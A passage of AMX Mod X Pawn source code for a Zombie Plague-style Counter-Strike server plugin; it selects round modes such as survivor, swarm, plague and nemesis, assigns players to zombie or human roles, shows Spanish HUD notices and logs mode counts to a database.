{
	if( g_zombie[id] || ( ( g_survivor[id] || gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || gWesker[id] || gJason[id] || gSniper[id] ) 
	&& !gArmageddonRound && !gTaringaRound && !gSynapsisRound ) )
		return PLUGIN_HANDLED;
	
	return PLUGIN_CONTINUE;
}

/*================================================================================
 [Main Functions]
=================================================================================*/

// Make Zombie Task
public make_zombie_task()
{
	new i_Player = fnGetRandomAlive( random_num( 1, fnGetAlive( ) ) )
	make_a_zombie(g_iStartMode[0], i_Player)
}

// Make a Zombie Function
make_a_zombie(mode, id) // make_a_zombie_f
{
	// Get alive players count
	static iPlayersnum
	iPlayersnum = fnGetAlive()
	
	// Not enough players, come back later!
	if (iPlayersnum < 1)
	{
		set_task(2.0, "make_zombie_task", TASK_MAKEZOMBIE)
		return;
	}
	
	// Round started!
	g_newround = false
	
	// Set up some common vars
	static forward_id, iZombies, iMaxZombies;
	
	if ((mode == MODE_NONE && random_num(1, 25) == 1 && iPlayersnum >= 1) || mode == MODE_SURVIVOR)
	{
		// Survivor Mode
		g_survround = true
		gMODE_SURVIVOR++
		
		CheckModes( MODE_SURVIVOR, gMODE_SURVIVOR )
		
		// Choose player randomly?
		if (mode == MODE_NONE)
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
		
		// Remember id for calling our forward later
		forward_id = id
		
		// Turn player into a survivor
		humanme(id, 1, 0, 0, 0, 0, 0)
		
		// Turn the remaining players into zombies
		for (id = 1; id <= g_maxplayers; id++)
		{
			// Not alive
			if (!g_isalive[id])
				continue;
			
			// Survivor or already a zombie
			if (g_survivor[id] || g_zombie[id])
				continue;
			
			// Turn into a zombie
			zombieme(id, 0, 0, 1, 0, 0)
		}
		
		// Play survivor sound
		//ArrayGetString(sound_survivor, random_num(0, ArraySize(sound_survivor) - 1), sound, charsmax(sound))
		PlaySound(gSOUND_ROUND_SURVIVOR[random_num(0, sizeof gSOUND_ROUND_SURVIVOR -1)]);
		
		// Show Survivor HUD notice
		set_hudmessage(20, 20, 255, HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 5.0, 1.0, 1.0, -1)
		ShowSyncHudMsg(0, g_MsgSync, "¡ %s ES UN SURVIVOR !", g_playername[forward_id])
		
		// Mode fully started!
		g_modestarted = true
		
		// Round start forward
		//ExecuteForward(g_fwRoundStart, g_fwDummyResult, MODE_SURVIVOR, forward_id);
	}
	else if ((mode == MODE_NONE && random_num(1, 20) == 1 && iPlayersnum >= 10) || mode == MODE_SWARM)
	{		
		// Swarm Mode
		g_swarmround = true
		gMODE_SWARM++
		
		CheckModes( MODE_SWARM, gMODE_SWARM )
		
		// Make sure there are alive players on both teams (BUGFIX)
		if (!fnGetAliveTs())
		{
			// Move random player to T team
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
			remove_task(id+TASK_TEAM)
			fm_cs_set_user_team(id, FM_CS_TEAM_T)
			fm_user_team_update(id)
		}
		else if (!fnGetAliveCTs())
		{
			// Move random player to CT team
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
			remove_task(id+TASK_TEAM)
			fm_cs_set_user_team(id, FM_CS_TEAM_CT)
			fm_user_team_update(id)
		}
		
		// Turn every T into a zombie
		for (id = 1; id <= g_maxplayers; id++)
		{
			// Not alive
			if (!g_isalive[id])
				continue;
			
			// Not a Terrorist
			if (fm_cs_get_user_team(id) != FM_CS_TEAM_T)
				continue;
			
			// Turn into a zombie
			zombieme(id, 0, 0, 1, 0, 0)
		}
		
		// Play swarm sound
		//ArrayGetString(sound_swarm, random_num(0, ArraySize(sound_swarm) - 1), sound, charsmax(sound))
		PlaySound(gSOUND_ROUND_SWARM);
		
		// Show Swarm HUD notice
		set_hudmessage(20, 255, 20, HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 5.0, 1.0, 1.0, -1)
		ShowSyncHudMsg(0, g_MsgSync, "¡ MODO SWARM !")
		
		// Mode fully started!
		g_modestarted = true
		
		// Round start forward
		//ExecuteForward(g_fwRoundStart, g_fwDummyResult, MODE_SWARM, 0);
	}
	else if ((mode == MODE_NONE && random_num(1, 20) == 1 && floatround(iPlayersnum*0.37, floatround_ceil) >= 2 && 
	floatround(iPlayersnum*0.37, floatround_ceil) < iPlayersnum && iPlayersnum >= 12) || mode == MODE_MULTI)
	{
		// Multi Infection Mode
		gMODE_MULTI++
		
		CheckModes( MODE_MULTI, gMODE_MULTI )
		
		// iMaxZombies is rounded up, in case there aren't enough players
		iMaxZombies = floatround(iPlayersnum*0.37, floatround_ceil)
		iZombies = 0
		
		// Randomly turn iMaxZombies players into zombies
		while (iZombies < iMaxZombies)
		{
			// Keep looping through all players
			if (++id > g_maxplayers) id = 1
			
			// Dead or already a zombie
			if (!g_isalive[id] || g_zombie[id])
				continue;
			
			// Random chance
			if (random_num(0, 1))
			{
				// Turn into a zombie
				zombieme(id, 0, 0, 1, 0, 0)
				iZombies++
			}
		}
		
		// Turn the remaining players into humans
		for (id = 1; id <= g_maxplayers; id++)
		{
			// Only those of them who aren't zombies
			if (!g_isalive[id] || g_zombie[id])
				continue;
			
			// Switch to CT
			if (fm_cs_get_user_team(id) != FM_CS_TEAM_CT) // need to change team?
			{
				remove_task(id+TASK_TEAM)
				fm_cs_set_user_team(id, FM_CS_TEAM_CT)
				fm_user_team_update(id)
			}
		}
		
		// Play multi infection sound
		//ArrayGetString(sound_multi, random_num(0, ArraySize(sound_multi) - 1), sound, charsmax(sound))
		PlaySound(gSOUND_ROUND_SWARM);
		
		// Show Multi Infection HUD notice
		set_hudmessage(200, 50, 0, HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 5.0, 1.0, 1.0, -1)
		ShowSyncHudMsg(0, g_MsgSync, "¡ INFECCIÓN MULTIPLE !")
		
		// Mode fully started!
		g_modestarted = true
		
		// Round start forward
		//ExecuteForward(g_fwRoundStart, g_fwDummyResult, MODE_MULTI, 0);
	}
	else if ((mode == MODE_NONE && random_num(1, 30) == 1 && floatround((iPlayersnum-2)*0.5, floatround_ceil) >= 1
	&& iPlayersnum-(2+floatround((iPlayersnum-2)*0.5, floatround_ceil)) >= 1 && iPlayersnum >= 15) || mode == MODE_PLAGUE)
	{
		// Plague Mode
		g_plagueround = true
		gMODE_PLAGUE++
		
		CheckModes( MODE_PLAGUE, gMODE_PLAGUE )
		
		// Turn specified amount of players into Survivors
		static iSurvivors, iMaxSurvivors
		iMaxSurvivors = 1
		iSurvivors = 0
		
		while (iSurvivors < iMaxSurvivors)
		{
			// Choose random guy
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
			
			// Already a survivor?
			if (g_survivor[id])
				continue;
			
			// If not, turn him into one
			humanme(id, 1, 0, 0, 0, 0, 0)
			iSurvivors++
			
			// Apply survivor health multiplier
			set_user_health(id, floatround(float(get_user_health(id)) * 0.5))
		}
		
		// Turn specified amount of players into Nemesis
		static iNemesis, iMaxNemesis
		iMaxNemesis = 1
		iNemesis = 0
		
		while (iNemesis < iMaxNemesis)
		{
			// Choose random guy
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
			
			// Already a survivor or nemesis?
			if (g_survivor[id] || g_nemesis[id])
				continue;
			
			// If not, turn him into one
			zombieme(id, 0, 1, 0, 0, 0)
			iNemesis++
			
			// Apply nemesis health multiplier
			set_user_health(id, floatround(float(get_user_health(id)) * 0.5))
		}
		
		// iMaxZombies is rounded up, in case there aren't enough players
		iMaxZombies = floatround((iPlayersnum-2)*0.5, floatround_ceil)
		iZombies = 0
		
		// Randomly turn iMaxZombies players into zombies
		while (iZombies < iMaxZombies)
		{
			// Keep looping through all players
			if (++id > g_maxplayers) id = 1
			
			// Dead or already a zombie or survivor
			if (!g_isalive[id] || g_zombie[id] || g_survivor[id])
				continue;
			
			// Random chance
			if (random_num(0, 1))
			{
				// Turn into a zombie
				zombieme(id, 0, 0, 1, 0, 0)
				iZombies++
			}
		}
		
		// Turn the remaining players into humans
		for (id = 1; id <= g_maxplayers; id++)
		{
			// Only those of them who arent zombies or survivor
			if (!g_isalive[id] || g_zombie[id] || g_survivor[id])
				continue;
			
			// Switch to CT
			if (fm_cs_get_user_team(id) != FM_CS_TEAM_CT) // need to change team?
			{
				remove_task(id+TASK_TEAM)
				fm_cs_set_user_team(id, FM_CS_TEAM_CT)
				fm_user_team_update(id)
			}
		}
		
		// Play plague sound
		//ArrayGetString(sound_plague, random_num(0, ArraySize(sound_plague) - 1), sound, charsmax(sound))
		if(random_num(0, 1) == 1) PlaySound(gSOUND_ROUND_NEMESIS[random_num(0, sizeof gSOUND_ROUND_NEMESIS -1)]);
		else PlaySound(gSOUND_ROUND_SURVIVOR[random_num(0, sizeof gSOUND_ROUND_SURVIVOR -1)]);
		
		// Show Plague HUD notice
		set_hudmessage(0, 50, 200, HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 5.0, 1.0, 1.0, -1)
		ShowSyncHudMsg(0, g_MsgSync, "¡ MODO PLAGUE !")
		
		// Mode fully started!
		g_modestarted = true
		
		// Round start forward
		//ExecuteForward(g_fwRoundStart, g_fwDummyResult, MODE_PLAGUE, 0);
	}
	else if ((mode == MODE_NONE && random_num(1, 35) == 1 && iPlayersnum >= 10) || mode == MODE_ARMAGEDDON)
	{	
		// Armageddon Mode
		gArmageddonRound = true
		gMODE_ARMAGEDDON++
		
		CheckModes( MODE_ARMAGEDDON, gMODE_ARMAGEDDON )
		
		// Make sure there are alive players on both teams (BUGFIX)
		if (!fnGetAliveTs())
		{
			// Move random player to T team
			id = fnGetRandomAlive(random_num(1, fnGetAlive()))
			remove_task(id+TASK_TEAM)
			fm_cs_set_user_team(id, FM_CS_TEAM_T)
			fm_user_team_update(id)
		}
		else if (!fnGetAliveCTs())
		{
			// Move random player to CT team
			id = fnGetRandomAlive(random_num(1, fnGetAlive()))
			remove_task(id+TASK_TEAM)
			fm_cs_set_user_team(id, FM_CS_TEAM_CT)
			fm_user_team_update(id)
		}
		
		gBubbleMaxInArmag = 0
		
		for( new i = 1; i <= g_maxplayers; i++ )
		{
			if(g_isalive[i])
			{
				g_frozen[i] = 1
				gBubble[i] = 1
				if( user_has_weapon(i, CSW_SMOKEGRENADE) ) ham_strip_weapons(i, "weapon_smokegrenade")
			}
		}
		
		gReduceVel = 15.0
	
		set_task(20.0, "FinishArmageddonInit")
		set_task(15.0, "StartArmageddon", id)
		set_task(0.01, "Notice_1")
		set_task(4.99, "Notice_2")
		set_task(9.00, "Notice_3")
		set_task(0.01, "ReduceSpeed")
		
		g_armageddon_init = 1;
		
		// ScreenFade
		message_begin(MSG_BROADCAST, g_msgScreenFade, _, id)
		write_short(UNIT_SECOND*4) // duration
		write_short(floatround(UNIT_SECOND*15.0+2.2)) // hold time
		write_short(0x0001) // fade type
		write_byte(0) // red
		write_byte(0) // green
		write_byte(0) // blue
		write_byte(255) // alpha
		message_end()
		
		// Play Armageddon sound
		client_cmd(0, "spk zombie_plague/tcs_sirena_2.wav")
		
		// Mode fully started!
		g_modestarted = true
		
		// Round start forward
		//ExecuteForward(g_fwRoundStart, g_fwDummyResult, MODE_ARMAGEDDON, 0);
	}
	else if ((mode == MODE_NONE && random_num(1, 35) == 1 && iPlayersnum >= 12) || mode == MODE_SYNAPSIS)
	{
		// Synapsis Mode
		gSynapsisRound = true
		gMODE_SYNAPSIS++
		
		CheckModes( MODE_SYNAPSIS, gMODE_SYNAPSIS )
		
		// Turn specified amount of players into Nemesis & Survivors
		static iNemesis, iMaxNemesis, iSurvivors, iMaxSurvivors;
		iMaxNemesis = 3
		iNemesis = 0
		
		while (iNemesis < iMaxNemesis)
		{
			// Choose random guy
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
			
			// Already a nemesis?
			if (g_nemesis[id])
				continue;
			
			// If not, turn him into one
			zombieme(id, 0, 1, 0, 0, 0)
			iNemesis++
			
			// Apply nemesis health divide
			set_user_health(id, get_user_health(id) / 2)
		}
		
		iMaxSurvivors = 3
		iSurvivors = 0
		
		while (iSurvivors < iMaxSurvivors)
		{
			// Choose random guy
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
			
			// Already a nemesis or survivor?
			if (g_nemesis[id] || g_survivor[id])
				continue;
			
			// If not, turn him into one
			humanme(id, 1, 0, 0, 0, 0, 0)
			iSurvivors++
		}
		
		// Turn the remaining players into humans
		for (id = 1; id <= g_maxplayers; id++)
		{
			// Only those of them who arent zombies
			if (!g_isalive[id] || g_nemesis[id] || g_survivor[id])
				continue;
			
			// Switch to CT
			if (fm_cs_get_user_team(id) != FM_CS_TEAM_CT) // need to change team?
			{
				remove_task(id+TASK_TEAM)
				fm_cs_set_user_team(id, FM_CS_TEAM_CT)
				fm_user_team_update(id)
			}
		}
		
		// Play synapsis sound
		//ArrayGetString(sound_plague, random_num(0, ArraySize(sound_plague) - 1), sound, charsmax(sound))
		if(random_num(0, 1) == 1) PlaySound(gSOUND_ROUND_NEMESIS[random_num(0, sizeof gSOUND_ROUND_NEMESIS -1)]);
		else PlaySound(gSOUND_ROUND_SURVIVOR[random_num(0, sizeof gSOUND_ROUND_SURVIVOR -1)]);
		
		// Show Synapsis HUD notice
		set_hudmessage(0, 200, 200, HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 5.0, 1.0, 1.0, -1)
		ShowSyncHudMsg(0, g_MsgSync, "¡ MODO SYNAPSIS !")
		
		// Mode fully started!
		g_modestarted = true
		
		// Round start forward
		//ExecuteForward(g_fwRoundStart, g_fwDummyResult, MODE_SYNAPSIS, 0);
	}
	else if ((mode == MODE_NONE && random_num(1, 35) == 1 && iPlayersnum >= 20) || mode == MODE_L4D)
	{
		// L4D Mode
		gL4DRound = true
		gMODE_L4D++
		
		CheckModes( MODE_L4D, gMODE_L4D )
		
		// Turn specified amount of players into Survivors
		static iSurvivors, iMaxSurvivors;
		iMaxSurvivors = 4
		iSurvivors = 0
		
		while (iSurvivors < iMaxSurvivors)
		{
			// Choose random guy
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
			
			// Already a L4D player?
			if (gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3])
				continue;
			
			// If not, turn him into one
			humanme(id, 0, 0, iSurvivors+1, 0, 0, 0)
			iSurvivors++
		}
		
		// Turn the remaining players into zombies
		for (id = 1; id <= g_maxplayers; id++)
		{
			// Not alive
			if (!g_isalive[id])
				continue;
			
			// L4D player or already a zombie
			if (gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || g_zombie[id])
				continue;
			
			// Turn into a zombie
			zombieme(id, 0, 0, 1, 0, 0)
		}
		
		// Play L4D sound
		//ArrayGetString(sound_plague, random_num(0, ArraySize(sound_plague) - 1), sound, charsmax(sound))
		if(random_num(0, 1) == 1) PlaySound(gSOUND_ROUND_NEMESIS[random_num(0, sizeof gSOUND_ROUND_NEMESIS -1)]);
		else PlaySound(gSOUND_ROUND_SURVIVOR[random_num(0, sizeof gSOUND_ROUND_SURVIVOR -1)]);
		
		// Show L4D HUD notice
		set_hudmessage(0, 200, 200, HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 5.0, 1.0, 1.0, -1)
		ShowSyncHudMsg(0, g_MsgSync, "¡ MODO L4D !")
		
		// Mode fully started!
		g_modestarted = true
		
		// Round start forward
		//ExecuteForward(g_fwRoundStart, g_fwDummyResult, MODE_L4D, 0);
	}
	else if ((mode == MODE_NONE && random_num(1, 35) == 1) || mode == MODE_WESKER)
	{
		// Wesker Mode
		gWeskerRound = true
		gMODE_WESKER++
		
		CheckModes( MODE_WESKER, gMODE_WESKER )
		
		// Choose player randomly?
		if (mode == MODE_NONE)
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
		
		// Remember id for calling our forward later
		forward_id = id
		
		// Turn player into a wesker
		humanme(id, 0, 0, 0, 1, 0, 0)
		
		// Turn the remaining players into zombies
		for (id = 1; id <= g_maxplayers; id++)
		{
			// Not alive
			if (!g_isalive[id])
				continue;
			
			// Wesker or already a zombie
			if (gWesker[id] || g_zombie[id])
				continue;
			
			// Turn into a zombie
			zombieme(id, 0, 0, 1, 0, 0)
		}
		
		// Play wesker sound
		//ArrayGetString(sound_survivor, random_num(0, ArraySize(sound_survivor) - 1), sound, charsmax(sound))
		PlaySound(gSOUND_ROUND_SURVIVOR[random_num(0, sizeof gSOUND_ROUND_SURVIVOR -1)]);
		
		// Show Wesker HUD notice
		set_hudmessage(0, 50, 200, HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 5.0, 1.0, 1.0, -1)
		ShowSyncHudMsg(0, g_MsgSync, "¡ %s ES UN WESKER !", g_playername[forward_id])
		
		// Mode fully started!
		g_modestarted = true
		
		// Round start forward
		//ExecuteForward(g_fwRoundStart, g_fwDummyResult, MODE_WESKER, forward_id);
	}
	else if ((mode == MODE_NONE && random_num(1, 35) == 1) && iPlayersnum >= 1 || mode == MODE_NINJA)
	{
		// Ninja Mode
		gJasonRound = true
		gMODE_NINJA++
		
		CheckModes( MODE_NINJA, gMODE_NINJA )
		
		// Choose player randomly?
		if (mode == MODE_NONE)
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
		
		// Remember id for calling our forward later
		forward_id = id
		
		// Turn player into a ninja
		humanme(id, 0, 0, 0, 0, 1, 0)
		
		// Turn the remaining players into zombies
		for (id = 1; id <= g_maxplayers; id++)
		{
			// Not alive
			if (!g_isalive[id])
				continue;
			
			// Ninja or already a zombie
			if (gJason[id] || g_zombie[id])
				continue;
			
			// Turn into a zombie
			zombieme(id, 0, 0, 1, 0, 0)
		}
		
		// Play ninja sound
		//ArrayGetString(sound_survivor, random_num(0, ArraySize(sound_survivor) - 1), sound, charsmax(sound))
		PlaySound(gSOUND_ROUND_SURVIVOR[random_num(0, sizeof gSOUND_ROUND_SURVIVOR -1)]);
		
		// Show Ninja HUD notice
		set_hudmessage(0, 50, 200, HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 5.0, 1.0, 1.0, -1)
		ShowSyncHudMsg(0, g_MsgSync, "¡ %s ES JASON !", g_playername[forward_id])
		
		// Mode fully started!
		g_modestarted = true
		
		// Round start forward
		//ExecuteForward(g_fwRoundStart, g_fwDummyResult, MODE_NINJA, forward_id);
	}
	else if ((mode == MODE_NONE && random_num(1, 35) == 1) && iPlayersnum >= 5 || mode == MODE_SNIPER)
	{
		// Sniper Mode
		gSniperRound = true
		gMODE_SNIPER++
		
		CheckModes( MODE_SNIPER, gMODE_SNIPER )
		
		// Turn specified amount of players into Nemesis & Survivor/Wesker/Ninja
		static iSnipers, iMaxSnipers;
		
		iMaxSnipers = 4
		iSnipers = 0
		while (iSnipers < iMaxSnipers)
		{
			// Choose random guy
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
			
			// Already a sniper?
			if (gSniper[id]) continue;
			
			// If not, turn him into one
			humanme(id, 0, 0, 0, 0, 0, iSnipers+1)
			iSnipers++
		}
		
		// Turn the remaining players into zombies
		for (id = 1; id <= g_maxplayers; id++)
		{
			// Not alive
			if (!g_isalive[id])
				continue;
			
			// Ninja or already a zombie
			if (gSniper[id] || g_zombie[id])
				continue;
			
			// Turn into a zombie
			zombieme(id, 0, 0, 1, 0, 0)
		}
		
		/*// Choose player randomly?
		if (mode == MODE_NONE)
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
		
		// Remember id for calling our forward later
		forward_id = id
		
		// Turn player into a sniper
		humanme(id, 0, 0, 0, 0, 0, 1)
		
		// Turn the remaining players into zombies
		for (id = 1; id <= g_maxplayers; id++)
		{
			// Not alive
			if (!g_isalive[id])
				continue;
			
			// Sniper or already a zombie
			if (gSniper[id] || g_zombie[id])
				continue;
			
			// Turn into a zombie
			zombieme(id, 0, 0, 1, 0, 0)
		}*/
		
		// Play sniper sound
		//ArrayGetString(sound_survivor, random_num(0, ArraySize(sound_survivor) - 1), sound, charsmax(sound))
		PlaySound(gSOUND_ROUND_SURVIVOR[random_num(0, sizeof gSOUND_ROUND_SURVIVOR -1)]);
		
		// Show Sniper HUD notice
		set_hudmessage(0, 50, 200, HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 5.0, 1.0, 1.0, -1)
		ShowSyncHudMsg(0, g_MsgSync, "¡ MODO SNIPER !")
		
		// Mode fully started!
		g_modestarted = true
		
		// Round start forward
		//ExecuteForward(g_fwRoundStart, g_fwDummyResult, MODE_SNIPER, 0);
	}
	else if ((mode == MODE_NONE && random_num(1, 40) == 1 && iPlayersnum >= 12) || mode == MODE_TARINGA)
	{
		// Taringa Mode
		gTaringaRound = true
		gMODE_TARINGA++
		
		CheckModes( MODE_TARINGA, gMODE_TARINGA )
		
		// Turn specified amount of players into Nemesis & Survivor/Wesker/Ninja
		static iNemesis, iMaxNemesis, iSurvivors, iMaxSurvivors, iWeskers, iMaxWeskers, iSnipers, iMaxSnipers;
		iMaxNemesis = 4
		iNemesis = 0
		
		while (iNemesis < iMaxNemesis)
		{
			// Choose random guy
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
			
			// Already a nemesis?
			if (g_nemesis[id])
				continue;
			
			// If not, turn him into one
			zombieme(id, 0, 1, 0, 0, 0)
			iNemesis++
		}
		
		iMaxSurvivors = 1
		iSurvivors = 0
		while (iSurvivors < iMaxSurvivors)
		{
			// Choose random guy
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
			
			// Already a nemesis or survivor?
			if (g_nemesis[id] || g_survivor[id])
				continue;
			
			// If not, turn him into one
			humanme(id, 1, 0, 0, 0, 0, 0)
			iSurvivors++
		}
		
		iMaxWeskers = 0
		iWeskers = 0
		while (iWeskers < iMaxWeskers)
		{
			// Choose random guy
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
			
			// Already a nemesis, survivor or wesker?
			if (g_nemesis[id] || g_survivor[id] || gWesker[id])
				continue;
			
			// If not, turn him into one
			humanme(id, 0, 0, 0, 1, 0, 0)
			iWeskers++
		}
		
		iMaxSnipers = 2
		iSnipers = 0
		while (iSnipers < iMaxSnipers)
		{
			// Choose random guy
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
			
			// Already a nemesis, survivor, wesker or ninja?
			if (g_nemesis[id] || g_survivor[id] || gWesker[id] || gSniper[id])
				continue;
			
			// If not, turn him into one
			humanme(id, 0, 0, 0, 0, 0, iSnipers+1)
			iSnipers++
		}
		
		// Turn the remaining players into humans
		for (id = 1; id <= g_maxplayers; id++)
		{
			// Only those of them who arent zombies
			if (!g_isalive[id] || g_nemesis[id] || g_survivor[id] || gWesker[id] || gJason[id])
				continue;
			
			// Switch to CT
			if (fm_cs_get_user_team(id) != FM_CS_TEAM_CT) // need to change team?
			{
				remove_task(id+TASK_TEAM)
				fm_cs_set_user_team(id, FM_CS_TEAM_CT)
				fm_user_team_update(id)
			}
		}
		
		// Play taringa sound
		//ArrayGetString(sound_plague, random_num(0, ArraySize(sound_plague) - 1), sound, charsmax(sound))
		if(random_num(0, 1) == 1) PlaySound(gSOUND_ROUND_NEMESIS[random_num(0, sizeof gSOUND_ROUND_NEMESIS -1)]);
		else PlaySound(gSOUND_ROUND_SURVIVOR[random_num(0, sizeof gSOUND_ROUND_SURVIVOR -1)]);
		
		// Show Taringa HUD notice
		set_hudmessage(0, 200, 200, HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 5.0, 1.0, 1.0, -1)
		ShowSyncHudMsg(0, g_MsgSync, "¡ MODO TARINGA !")
		
		// Mode fully started!
		g_modestarted = true
		
		// Round start forward
		//ExecuteForward(g_fwRoundStart, g_fwDummyResult, MODE_TARINGA, 0);
	}
	else
	{
		// Single Infection Mode or Nemesis Mode
		
		// Choose player randomly?
		if (mode == MODE_NONE)
			id = fnGetRandomAlive(random_num(1, iPlayersnum))
		
		// Remember id for calling our forward later
		forward_id = id
		
		if ((mode == MODE_NONE && random_num(1, 25) == 1 && iPlayersnum >= 1) || mode == MODE_NEMESIS)
		{
			// Nemesis Mode
			g_nemround = true
			gMODE_NEMESIS++
			
			CheckModes( MODE_NEMESIS, gMODE_NEMESIS )
			
			// Turn player into nemesis
			zombieme(id, 0, 1, 0, 0, 0)
		}
		else if ((mode == MODE_NONE && random_num(1, 55) == 1 && iPlayersnum >= 20) || mode == MODE_TROLL)
		{
			// Troll Mode
			gTrollRound = true
			gMODE_TROLL++
			
			CheckModes( MODE_TROLL, gMODE_TROLL )
			
			// Turn player into troll
			zombieme(id, 0, 0, 0, 0, 1)
			
			for( new i = 1; i <= g_maxplayers; i++ )
			{
				if(g_isalive[i])
				{
					if( user_has_weapon(i, CSW_HEGRENADE) ) 
						ham_strip_weapons(i, "weapon_hegrenade")
					
					if( user_has_weapon(i, CSW_FLASHBANG) ) 
						ham_strip_weapons(i, "weapon_flashbang")
						
					if( user_has_weapon(i, CSW_SMOKEGRENADE) ) 
						ham_strip_weapons(i, "weapon_smokegrenade")
				}
			}
		}
		else
		{
			// Single Infection Mode
			gMODE_INFECTION++
			
			CheckModes( MODE_INFECTION, gMODE_INFECTION )
			
			// Turn player into the first zombie
			zombieme(id, 0, 0, 0, 0, 0)
		}
		
		// Remaining players should be humans (CTs)
		for (id = 1; id <= g_maxplayers; id++)
		{
			// Not alive
			if (!g_isalive[id])
				continue;
			
			// First zombie/nemesis
			if (g_zombie[id])
				continue;
			
			// Switch to CT
			if (fm_cs_get_user_team(id) != FM_CS_TEAM_CT) // need to change team?
			{
				remove_task(id+TASK_TEAM)
				fm_cs_set_user_team(id, FM_CS_TEAM_CT)
				fm_user_team_update(id)
			}
		}
		
		if (g_nemround)
		{
			// Play Nemesis sound
			//ArrayGetString(sound_nemesis, random_num(0, ArraySize(sound_nemesis) - 1), sound, charsmax(sound))
			PlaySound(gSOUND_ROUND_NEMESIS[random_num(0, sizeof gSOUND_ROUND_NEMESIS -1)]);
			
			// Show Nemesis HUD notice
			set_hudmessage(255, 20, 20, HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 5.0, 1.0, 1.0, -1)
			ShowSyncHudMsg(0, g_MsgSync, "¡ %s ES UN NEMESIS !", g_playername[forward_id])
			
			// Mode fully started!
			g_modestarted = true
			
			// Round start forward
			//ExecuteForward(g_fwRoundStart, g_fwDummyResult, MODE_NEMESIS, forward_id);
		}
		else if (gTrollRound)
		{
			// Play Troll sound
			//ArrayGetString(sound_nemesis, random_num(0, ArraySize(sound_nemesis) - 1), sound, charsmax(sound))
			PlaySound(gSOUND_ZOMBIE_INFECT[0]);
			
			// Show Troll HUD notice
			/*set_hudmessage(255, 20, 20, HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 5.0, 1.0, 1.0, -1)
			ShowSyncHudMsg(0, g_MsgSync, "¡ %s ES UN TROLL !", g_playername[forward_id])*/
			set_dhudmessage(255, 20, 20, HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 5.0, 1.0, 1.0)
			show_dhudmessage(0, "¡ %s ES UN TROLL !", g_playername[forward_id])
			
			// Mode fully started!
			g_modestarted = true
			
			// Round start forward
			//ExecuteForward(g_fwRoundStart, g_fwDummyResult, MODE_TROLL, forward_id);
		}
		else
		{
			// Show First Zombie HUD notice
			set_hudmessage(255, 0, 0, HUD_EVENT_X, HUD_EVENT_Y, 0, 0.0, 5.0, 1.0, 1.0, -1)
			ShowSyncHudMsg(0, g_MsgSync, "¡ %s ES EL PRIMER ZOMBIE !", g_playername[forward_id])
			
			// Mode fully started!
			g_modestarted = true
			
			// Round start forward
			//ExecuteForward(g_fwRoundStart, g_fwDummyResult, MODE_INFECTION, forward_id);
		}
	}
	
	SQL_QueryAndIgnore( SQL_CONNECTION, "UPDATE `modes` SET `infeccion` = '%d', `nemesis` = '%d', `survivor` = '%d', `swarm` = '%d', `multiple` = '%d', `plague` = '%d', \
	`armageddon` = '%d', `synapsis` = '%d', `l4d` = '%d', `wesker` = '%d', `ninja` = '%d', `sniper` = '%d', `taringa` = '%d', `troll` = '%d';", gMODE_INFECTION, gMODE_NEMESIS,
	gMODE_SURVIVOR, gMODE_SWARM, gMODE_MULTI, gMODE_PLAGUE, gMODE_ARMAGEDDON, gMODE_SYNAPSIS, gMODE_L4D, gMODE_WESKER, gMODE_NINJA, gMODE_SNIPER, gMODE_TARINGA, gMODE_TROLL )
}

// Zombie Me Function (player id, infector, turn into a nemesis, silent mode, deathmsg and rewards)
zombieme(id, infector, nemesis, silentmode, rewards, troll) // ZOMBIEME_F
{
	// User infect attempt forward
	//ExecuteForward(g_fwUserInfect_attempt, g_fwDummyResult, id, infector, nemesis)
	
	// One or more plugins blocked the infection. Only allow this after making sure it's
	// not going to leave us with no zombies. Take into account a last player leaving case.
	// BUGFIX: only allow after a mode has started, to prevent blocking first zombie e.g.
	if (g_fwDummyResult >= ZP_PLUGIN_HANDLED && g_modestarted && fnGetZombies() > g_lastplayerleaving)
		return;
	
	// Pre user infect forward
	//ExecuteForward(g_fwUserInfected_pre, g_fwDummyResult, id, infector, nemesis)
	
	// Check if player is stuck with a human
	if (g_isalive[id])
	{
		if (is_player_stuck(id, 1))
		{
			// Move to an initial spawn
			do_random_spawn(id) // random spawn (including CSDM)
			CC(id, "!g[ZP]!y Has sido teletransportado debido a que te habías trabado con un humano")
		}
	}
	
	// Set selected zombie class
	g_zombieclass[id] = g_zombieclassnext[id]
	// If no class selected yet, use the first (default) one
	if (g_zombieclass[id] == ZCLASS_NONE) g_zombieclass[id] = 0
	
	// Way to go...
	g_zombie[id] = true
	g_nemesis[id] = false
	gTroll[id] = false
	g_survivor[id] = false
	g_firstzombie[id] = false
	gPlayersL4D[id] = { false, false, false, false }
	gWesker[id] = false
	gJason[id] = false
	gSniper[id] = false
	
	// Remove survivor's aura (bugfix)
